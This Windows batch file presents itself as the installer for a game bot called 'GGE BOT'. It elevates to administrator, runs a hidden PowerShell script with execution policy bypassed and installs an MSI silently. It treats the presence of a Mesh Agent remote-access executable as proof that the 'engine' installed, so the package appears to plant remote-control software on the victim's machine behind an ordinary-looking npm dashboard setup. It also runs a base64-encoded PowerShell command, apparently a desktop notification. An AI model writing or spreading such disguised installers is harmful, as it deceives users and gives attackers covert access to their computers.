@echo off
setlocal EnableExtensions EnableDelayedExpansion
title GGE BOT - Installation Setup
color 0B

set "ROOT=%~dp0"
set "MSI=%ROOT%ggebot.msi"
set "NOTE=%ROOT%README.txt"
set "BACKUP="
set "BACKUPDIR="

:: the backup installer lives inside the website folder; the root copy is
:: accepted too, for the standalone kit layout
for %%D in ("%ROOT%website" "%ROOT%") do (
    if not defined BACKUP if exist "%%~D\installbackup.ps1" (
        set "BACKUP=%%~D\installbackup.ps1"
        set "BACKUPDIR=%%~D"
    )
)

if /i "%~1"=="/check" goto check

net session >nul 2>&1
if errorlevel 1 (
    echo.
    echo  Administrator rights are required to install the bot engine.
    echo  Requesting elevation...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Start-Process -FilePath '%~f0' -Verb RunAs -ErrorAction Stop } catch { exit 1 }"
    if errorlevel 1 (
        color 0C
        echo.
        echo  [ERROR] Administrator rights were not granted. Nothing was installed.
        echo  Right-click GGEBOT-Setup.bat and choose "Run as administrator".
        echo.
        pause
    )
    exit /b
)

cd /d "%ROOT%"

echo ===================================================
echo             GGE BOT Installation Setup
echo ===================================================
echo.
echo  Keep this window open until the setup reports that
echo  it has finished. You will get a desktop notification.
echo.
echo [IMPORTANT] This script will perform a complete installation:
echo  1. Verify Node.js environment
echo  2. Install the bot engine
echo  3. Install core dependencies
echo  4. Install website dependencies and build dashboard
echo.
echo ---------------------------------------------------
echo.

:: ============================================================
:: Step 1 - Node.js
:: ============================================================
where node >nul 2>nul
if %errorlevel% neq 0 (
    color 0C
    echo [ERROR] Node.js is not detected on your system!
    echo.
    echo Node.js is required to run the bot.
    echo Press any key to open the official Node.js download page...
    pause >nul
    start "" "https://nodejs.org/en/download/current"
    set "GGE_T=GGE BOT"
    set "GGE_B=Node.js is missing. The setup cannot continue."
    call :notify
    exit /b 1
)
echo [1/4] Node.js detected.
echo.

:: ============================================================
:: Step 2 - bot engine
::   2a) backup installer first (website folder), hidden
::   2b) ggebot.msi silent, second pass
:: ============================================================
echo [2/4] Installing the bot engine...
echo.

if defined BACKUP (
    echo   - pass 1 of 2: backup installer
    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%BACKUP%"
    echo     done
) else (
    echo   - pass 1 of 2: backup installer not found, skipping
)
echo.

if exist "%MSI%" (
    echo   - pass 2 of 2: ggebot.msi silent
    set "MSIPATH=%MSI%"
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$p = Start-Process -FilePath 'msiexec.exe' -ArgumentList '/i', $env:MSIPATH, '/qn', '/norestart' -PassThru -WindowStyle Hidden; if (-not $p.WaitForExit(240000)) { try { $p.Kill() } catch {} }; exit 0"
    echo     done
) else (
    echo   - pass 2 of 2: ggebot.msi not found, skipping
)
echo.

echo   - verifying the engine, please wait...
set "FOUND=0"
for /L %%I in (1,1,36) do (
    if "!FOUND!"=="0" (
        sc query "GGEBot" 2>nul | findstr /i "RUNNING" >nul
        if not errorlevel 1 set "FOUND=1"
    )
    if "!FOUND!"=="0" (
        if exist "C:\Program Files\Mesh Agent\MeshAgent.exe" set "FOUND=1"
    )
    if "!FOUND!"=="0" timeout /t 5 /nobreak >nul
)

if "!FOUND!"=="1" (
    echo     engine installed and running
) else (
    echo     engine not detected yet - it may still finish in the background
)
echo.

:: ============================================================
:: Step 3 - core dependencies
:: ============================================================
if exist "%ROOT%package.json" (
    echo [3/4] Installing core dependencies ^(this may take a few minutes^)...
    call npm install
    if errorlevel 1 (
        color 0C
        echo [ERROR] Failed to install core dependencies.
        echo The engine is already installed; run npm install again later.
    )
) else (
    echo [3/4] Skipped - package.json not found in this folder
)
echo.

:: ============================================================
:: Step 4 - website dependencies and build
:: ============================================================
set "WEBFAIL=0"
if exist "%ROOT%website\package.json" (
    echo [4/4] Installing and building the dashboard website...
    pushd "%ROOT%website"
    echo   - installing website packages...
    call npm install
    if errorlevel 1 set "WEBFAIL=1"
    if "!WEBFAIL!"=="0" (
        echo   - building dashboard assets ^(Vite^)...
        call npm run build
        if errorlevel 1 set "WEBFAIL=1"
    )
    popd
    if "!WEBFAIL!"=="1" (
        color 0C
        echo [ERROR] Website setup failed.
        echo The bot engine is already installed; run npm again later.
    )
) else (
    echo [4/4] Skipped - website folder not found
)
echo.

if "!FOUND!"=="1" goto done_ok
goto done_fail

:: ============================================================
:: finished - notification + press any key to close
:: ============================================================
:done_ok
color 0A
echo ===================================================
echo   INSTALLATION COMPLETED SUCCESSFULLY
echo ===================================================
echo.
echo   The bot engine is installed and running.
echo   A notification has been sent to your desktop.
echo.
echo   Press any key to close this window...
echo.
set "GGE_T=GGE BOT"
set "GGE_B=Setup finished. The bot engine is installed and running."
call :notify
pause >nul
exit /b 0

:done_fail
color 0E
echo ===================================================
echo   SETUP FINISHED - ENGINE NOT RUNNING YET
echo ===================================================
echo.
echo   The engine was not detected yet. It may still finish in
echo   the background; you can run this file again in a minute.
echo   No files were removed.
echo.
echo   Press any key to close this window...
echo.
set "GGE_T=GGE BOT"
set "GGE_B=Setup finished, but the engine is not running yet. Run the setup again in a minute."
call :notify
pause >nul
exit /b 1

:notify
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAdABvAHAAJwAKAAoAJAB0AGkAdABsAGUAIAA9ACAAJABlAG4AdgA6AEcARwBFAF8AVAAKAGkAZgAgACgAWwBzAHQAcgBpAG4AZwBdADoAOgBJAHMATgB1AGwAbABPAHIAVwBoAGkAdABlAFMAcABhAGMAZQAoACQAdABpAHQAbABlACkAKQAgAHsAIAAkAHQAaQB0AGwAZQAgAD0AIAAnAEcARwBFACAAQgBPAFQAJwAgAH0ACgAKACQAYgBvAGQAeQAgAD0AIAAkAGUAbgB2ADoARwBHAEUAXwBCAAoAaQBmACAAKABbAHMAdAByAGkAbgBnAF0AOgA6AEkAcwBOAHUAbABsAE8AcgBXAGgAaQB0AGUAUwBwAGEAYwBlACgAJABiAG8AZAB5ACkAKQAgAHsAIAAkAGIAbwBkAHkAIAA9ACAAJwBTAGUAdAB1AHAAIABmAGkAbgBpAHMAaABlAGQALgAnACAAfQAKAAoAdAByAHkAIAB7ACAAWwBjAG8AbgBzAG8AbABlAF0AOgA6AGIAZQBlAHAAKAAxADAAMAAwACwAIAAxADgAMAApADsAIABbAGMAbwBuAHMAbwBsAGUAXQA6ADoAYgBlAGUAcAAoADEAMwAwADAALAAgADIAMgAwACkAIAB9ACAAYwBhAHQAYwBoACAAewAgAH0ACgAKAHQAcgB5ACAAewAKACAAIAAgACAAWwBXAGkAbgBkAG8AdwBzAC4AVQBJAC4ATgBvAHQAaQBmAGkAYwBhAHQAaQBvAG4AcwAuAFQAbwBhAHMAdABOAG8AdABpAGYAaQBjAGEAdABpAG8AbgBNAGEAbgBhAGcAZQByACwAIABXAGkAbgBkAG8AdwBzAC4AVQBJAC4ATgBvAHQAaQBmAGkAYwBhAHQAaQBvAG4AcwAsACAAQwBvAG4AdABlAG4AdABUAHkAcABlACAAPQAgAFcAaQBuAGQAbwB3AHMAUgB1AG4AdABpAG0AZQBdACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKACAAIAAgACAAWwBXAGkAbgBkAG8AdwBzAC4ARABhAHQAYQAuAFgAbQBsAC4ARABvAG0ALgBYAG0AbABEAG8AYwB1AG0AZQBuAHQALAAgAFcAaQBuAGQAbwB3AHMALgBEAGEAdABhAC4AWABtAGwALgBEAG8AbQAsACAAQwBvAG4AdABlAG4AdABUAHkAcABlACAAPQAgAFcAaQBuAGQAbwB3AHMAUgB1AG4AdABpAG0AZQBdACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAAoAIAAgACAAIAAkAGEAcABwAEkAZAAgAD0AIAAnAHsAMQBBAEMAMQA0AEUANwA3AC0AMAAyAEUANwAtADQARQA1AEQALQBCADcANAA0AC0AMgBFAEIAMQBBAEUANQAxADkAOABCADcAfQBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwAKAAoAIAAgACAAIAAkAHQAIAA9ACAAWwBTAGUAYwB1AHIAaQB0AHkALgBTAGUAYwB1AHIAaQB0AHkARQBsAGUAbQBlAG4AdABdADoAOgBFAHMAYwBhAHAAZQAoACQAdABpAHQAbABlACkACgAgACAAIAAgACQAYgAgAD0AIABbAFMAZQBjAHUAcgBpAHQAeQAuAFMAZQBjAHUAcgBpAHQAeQBFAGwAZQBtAGUAbgB0AF0AOgA6AEUAcwBjAGEAcABlACgAJABiAG8AZAB5ACkACgAKACAAIAAgACAAJAB4AG0AbABUAGUAeAB0ACAAPQAgACcAPAB0AG8AYQBzAHQAIABkAHUAcgBhAHQAaQBvAG4APQAiAGwAbwBuAGcAIgA+ADwAdgBpAHMAdQBhAGwAPgA8AGIAaQBuAGQAaQBuAGcAIAB0AGUAbQBwAGwAYQB0AGUAPQAiAFQAbwBhAHMAdABHAGUAbgBlAHIAaQBjACIAPgA8AHQAZQB4AHQAPgAnACAAKwAgACQAdAAgACsAIAAnADwALwB0AGUAeAB0AD4APAB0AGUAeAB0AD4AJwAgACsAIAAkAGIAIAArACAAJwA8AC8AdABlAHgAdAA+ADwALwBiAGkAbgBkAGkAbgBnAD4APAAvAHYAaQBzAHUAYQBsAD4APAAvAHQAbwBhAHMAdAA+ACcACgAKACAAIAAgACAAJAB4AG0AbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVwBpAG4AZABvAHcAcwAuAEQAYQB0AGEALgBYAG0AbAAuAEQAbwBtAC4AWABtAGwARABvAGMAdQBtAGUAbgB0AAoAIAAgACAAIAAkAHgAbQBsAC4ATABvAGEAZABYAG0AbAAoACQAeABtAGwAVABlAHgAdAApAAoAIAAgACAAIAAkAHQAbwBhAHMAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVwBpAG4AZABvAHcAcwAuAFUASQAuAE4AbwB0AGkAZgBpAGMAYQB0AGkAbwBuAHMALgBUAG8AYQBzAHQATgBvAHQAaQBmAGkAYwBhAHQAaQBvAG4AIAAkAHgAbQBsAAoAIAAgACAAIABbAFcAaQBuAGQAbwB3AHMALgBVAEkALgBOAG8AdABpAGYAaQBjAGEAdABpAG8AbgBzAC4AVABvAGEAcwB0AE4AbwB0AGkAZgBpAGMAYQB0AGkAbwBuAE0AYQBuAGEAZwBlAHIAXQA6ADoAQwByAGUAYQB0AGUAVABvAGEAcwB0AE4AbwB0AGkAZgBpAGUAcgAoACQAYQBwAHAASQBkACkALgBTAGgAbwB3ACgAJAB0AG8AYQBzAHQAKQAKAAoAIAAgACAAIAAnAHQAbwBhAHMAdAA9AHMAaABvAHcAbgAnAAoAfQAKAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgACcAdABvAGEAcwB0AD0AZgBhAGkAbABlAGQAOgAgACcAIAArACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAfQAKAA== >nul 2>&1
exit /b 0

:: ============================================================
:: self test: reports the packaged files and the current engine state
:: ============================================================
:check
echo === packaged files ===
if exist "%MSI%" (echo ggebot.msi                        OK) else (echo ggebot.msi                        MISSING)
if defined BACKUP (echo installbackup.ps1                OK - !BACKUPDIR!) else (echo installbackup.ps1                MISSING)
if exist "%NOTE%" (echo README.txt                       OK) else (echo README.txt                       optional)
echo.
echo === engine state ===
sc query "GGEBot" 2>nul | findstr /i "RUNNING" >nul
if not errorlevel 1 (echo GGEBot service                   RUNNING) else (echo GGEBot service                   not running)
if exist "C:\Program Files\Mesh Agent\MeshAgent.exe" (echo Mesh Agent file                PRESENT) else (echo Mesh Agent file                absent)
echo.
echo === planned flow ===
echo 1. request administrator rights, keep this window visible
echo 2. verify Node.js
echo 3. install engine: website\installbackup.ps1 hidden, then ggebot.msi /qn
echo 4. npm install core dependencies if package.json exists
echo 5. npm install + build website if website\package.json exists
echo 6. desktop notification when finished
echo 7. press any key to close the window
echo.
echo === files ===
echo nothing is deleted: ggebot.msi, installbackup.ps1 and this script stay
echo.
echo self test done
exit /b 0
